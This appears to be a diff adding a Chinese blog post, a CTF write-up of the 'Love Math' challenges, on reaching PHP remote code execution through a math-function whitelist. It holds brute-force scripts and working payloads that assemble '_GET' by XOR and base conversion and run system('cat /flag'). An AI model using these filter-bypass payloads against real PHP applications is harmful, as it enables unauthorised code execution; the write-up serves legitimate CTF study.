@@ -1,0 +1,814 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" href="/img/fav.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sloth">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="php利用math函数rce相关思考与理解0x00题目背景来自2019国赛love math，以及[NESTCTF 2019]Love Math 2，两题的区别在于对payload的长度限制不同 相关过滤长度限制 1234$content &#x3D; $_GET[&amp;#x27;c&amp;#x27;];if (strlen($content) &gt;&#x3D; 60) &amp;#123;&#x2F;&#x2F;国赛限制80    die(&amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php利用math函数rce相关思考与理解">
+<meta property="og:url" content="http://sloth31.github.io/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Sloth&#39;s Blog">
+<meta property="og:description" content="php利用math函数rce相关思考与理解0x00题目背景来自2019国赛love math，以及[NESTCTF 2019]Love Math 2，两题的区别在于对payload的长度限制不同 相关过滤长度限制 1234$content &#x3D; $_GET[&amp;#x27;c&amp;#x27;];if (strlen($content) &gt;&#x3D; 60) &amp;#123;&#x2F;&#x2F;国赛限制80    die(&amp;quo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214590.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214171.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214513.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072226764.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072228668.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227751.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072229986.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227919.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227457.jpg">
+<meta property="article:published_time" content="2022-01-20T15:29:13.000Z">
+<meta property="article:modified_time" content="2023-12-07T14:40:03.766Z">
+<meta property="article:author" content="Sloth">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="rce">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214590.jpg">
+  
+  
+  
+  <title>php利用math函数rce相关思考与理解 | Sloth&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sloth&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php利用math函数rce相关思考与理解"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-01-20 23:29" pubdate>
+          2022年1月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">php利用math函数rce相关思考与理解</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="php利用math函数rce相关思考与理解"><a href="#php利用math函数rce相关思考与理解" class="headerlink" title="php利用math函数rce相关思考与理解"></a>php利用math函数rce相关思考与理解</h1><h2 id="0x00题目背景"><a href="#0x00题目背景" class="headerlink" title="0x00题目背景"></a>0x00题目背景</h2><p>来自2019国赛love math，以及[NESTCTF 2019]Love Math 2，两题的区别在于对payload的长度限制不同</p>
+<h3 id="相关过滤"><a href="#相关过滤" class="headerlink" title="相关过滤"></a>相关过滤</h3><p>长度限制</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">60</span>) &#123;<span class="hljs-comment">//国赛限制80</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>黑名单特殊字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br></code></pre></td></tr></table></figure>
+
+<p>白名单函数（都为math函数）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <span class="hljs-comment">//提取payload中函数名及变量名</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>php参考手册中提到，用于匹配php有效变量名，可以使用正则<code>[a-zA-Z_/x7f-/xff][a-zA-Z0-9_/x7f-/xff]*</code> 因此payload中若使用变量，命名必须在白名单函数中选择,如果是数组索引也可以用纯数字(不符合变量名命名法则)</p>
+</blockquote>
+<h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>eval函数参数若是字符串，必须符合php代码语法，因此可以插入多行代码</p>
+</blockquote>
+<h2 id="0x01-利用math函数构造函数名"><a href="#0x01-利用math函数构造函数名" class="headerlink" title="0x01 利用math函数构造函数名"></a>0x01 利用math函数构造函数名</h2><h3 id="进制转换–获取小写字母"><a href="#进制转换–获取小写字母" class="headerlink" title="进制转换–获取小写字母"></a>进制转换–获取小写字母</h3><p>利用到进制转换，从11进制到36进制均有小写字母，在保证转换结果简洁及纯数字的情况下，选择36进制转10进制(36进制含a-z)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//先反向</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//15941</span><br><span class="hljs-comment">//这样就可以用纯数字通过三十六进制转换得到纯字母字符串了</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">15941</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<span class="hljs-comment">//cat</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="字符串异或–获取特殊字符及其组合"><a href="#字符串异或–获取特殊字符及其组合" class="headerlink" title="字符串异或–获取特殊字符及其组合"></a>字符串异或–获取特殊字符及其组合</h3><h4 id="异或性质"><a href="#异或性质" class="headerlink" title="异或性质"></a>异或性质</h4><ol>
+<li>结合律a ^ b ^ c &#x3D; a ^ c ^ b</li>
+<li>交换律a ^ b &#x3D; b ^ a</li>
+<li>数值交换（能交换 a 与 b 的值）a &#x3D; a ^ b; b &#x3D; a ^ b; a &#x3D; a ^ b;</li>
+<li>a^b^b&#x3D;a</li>
+</ol>
+<h4 id="php字符串异或分为两种情况"><a href="#php字符串异或分为两种情况" class="headerlink" title="php字符串异或分为两种情况"></a>php字符串异或分为两种情况</h4><ul>
+<li><p>长度一致的字符串异或，对应字符各自转换成ascii码值异或后得到新字符，组成新字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*\/&quot;</span>;<span class="hljs-comment">//^=A</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>长度不一致的字符串异或，按最短的字符串长度按位异或</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*&quot;</span>;<span class="hljs-comment">//^</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>异或字符串可以构造出新字符，但只用白名单的函数名的话，大多是ascii码值接近的小写字母，异或后得到的也多是ascii码值小的<u>不可见字符</u>，不够全面。</p>
+<p>因此可以利用<code>a^b^b=a</code>这个性质，将a看作要获取的特殊字符，b为白名单函数名异或组合,靠脚本爆破出可以通过进制转换表示的<code>a^b</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//爆破脚本</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$whitelist1</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-variable">$whitelist2</span> = [ <span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<span class="hljs-comment">//与whitelist1相同</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span>):<br>   <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist2</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>):<br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>^<span class="hljs-variable">$i</span>^<span class="hljs-string">&quot; /&quot;</span>;<span class="hljs-comment">//a^b</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;   &quot;</span> . <span class="hljs-variable">$i</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$k</span>;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   <span class="hljs-keyword">endforeach</span>;<br><span class="hljs-keyword">endforeach</span>;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>输出结果说明</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">16</span>   tanh exp <span class="hljs-comment">//意思是&quot; /&quot;^tanh^exp=&quot;16&quot;</span><br><span class="hljs-comment">//因此要想得到&quot; /&quot;只要</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">22</span>)^tanh^exp  <span class="hljs-comment">//即&quot; /&quot;^tanh^exp^tanh^exp=&quot; /&quot;^0=&quot; /&quot;</span><br><span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-number">10</span>)^tanh^exp<span class="hljs-comment">//也可以</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="注意⚠️"><a href="#注意⚠️" class="headerlink" title="注意⚠️"></a>注意⚠️</h4><ul>
+<li><p>不能直接<code>16^tanh^exp</code> ，这样的16会被当作int型数据处理，使用进制转换函数可以转成string类型，同时选取的数值转成16进制不能有字母。</p>
+</li>
+<li><p>根据长度不一致字符串异或的运算规则，白名单中最短的是pi，因此特殊字符组合尽量不超过两个，如果一定要更长的特殊字符组合，要删除白名单中较短的函数名，不然得到的结果都是截断的，而特殊字符组合越长，白名单中可用函数名也就越少，出现纯数字结果的可能性也越低，这也是为什么这里不能直接构造<code>system(&#39;cat /flag&#39; )</code></p>
+</li>
+</ul>
+</blockquote>
+<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>一旦将特殊字符改成大写字母或与下划线的组合，输出中几乎没有纯数字结果。</p>
+<h3 id="引入数字字符串的异或–构造下划线和大写字母组合"><a href="#引入数字字符串的异或–构造下划线和大写字母组合" class="headerlink" title="引入数字字符串的异或–构造下划线和大写字母组合"></a>引入数字字符串的异或–构造下划线和大写字母组合</h3><p>上面的异或结果可以归纳成<code>特殊字符组合^白名单函数1^白名单函数2=纯数字字符串</code>。</p>
+<p>因此可以合理推测<code>纯数字字符串^白名单函数1^白名单函数2=特殊字符组合</code>。</p>
+<p>纯字符串如果用<code>dechex</code>的方式转换，非常浪费payload长度，可以利用字符串拼接时类型转换的特性。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$i</span>=(<span class="hljs-number">1</span>).(<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$i</span>);<span class="hljs-comment">//string(2) &quot;12&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>爆破脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$k</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">9</span>; <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$j</span> &lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-variable">$exp</span> = <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^ <span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;<span class="hljs-comment">//$i $j字符串拼接得到&quot;00&quot;-&quot;99&quot;</span><br>            <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-subst">$exp</span>&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>由于pi的存在，构造出来的组合都是两个字符，会惊喜地发现大多数为下划线和大写字母组合。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">结果中 tanh^<span class="hljs-number">15</span>==&gt;ET is_nan^<span class="hljs-number">64</span>==&gt;_G <br>因此构造 (is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>)) 正是 <span class="hljs-string">&quot;_G&quot;</span>.<span class="hljs-string">&quot;ET&quot;</span> ，即 <span class="hljs-string">&quot;_GET&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>再根据PHP可变变量的特性</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-comment">//_GET</span><br><span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">1</span>&#125;;<span class="hljs-comment">//$_GET[1]</span><br></code></pre></td></tr></table></figure>
+
+<p>{}可以代替[],这样就可以通过get传参数，缩短payload长度</p>
+</blockquote>
+<p>$_GET[1]接收的数值会转换成字符串，因此即使拼接到了代码中也无法执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214590.jpg" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214171.jpg" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p>因此需要像eval这样的函数执行字符串php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">42633</span>,<span class="hljs-number">19</span>,<span class="hljs-number">33</span>)(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>也可以利用php可变函数的特性：<code>($a)[system]($_GET[1])</code> –&gt;php会将<code>$_GET[1]</code>的内容当作参数传入system函数执行。<code>$a</code>只要求是个变量，在这题的背景下可以用<code>$pi</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">0</span>&#125;(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat /flag<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x02-payload缩短技巧"><a href="#0x02-payload缩短技巧" class="headerlink" title="0x02 payload缩短技巧"></a>0x02 payload缩短技巧</h2><h3 id="通过外部传参数"><a href="#通过外部传参数" class="headerlink" title="通过外部传参数"></a>通过外部传参数</h3><ul>
+<li><p>使用$_GET[1]，索引选择最简短且符合题目要求的数字1，系统命令通过1传参，不占有payload</p>
+</li>
+<li><p>使用getallheaders获取请求头信息，将索引设成1，将获取header中key为1的value，再将这个结果传入exec函数，但这个payload较长，超过60字符</p>
